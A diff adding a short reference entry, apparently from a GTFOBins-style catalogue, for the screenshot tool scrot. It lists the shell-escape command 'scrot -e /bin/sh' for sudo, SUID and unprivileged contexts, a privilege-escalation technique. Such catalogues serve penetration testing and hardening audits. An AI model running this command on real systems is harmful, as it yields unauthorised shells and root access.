@@ -1,0 +1,14 @@
+scrot
+=====
+
+Shell
+-----
+
+[Sudo]
+    scrot -e /bin/sh
+
+[SUID]
+    scrot -e /bin/sh
+
+[Unprivileged]
+    scrot -e /bin/sh
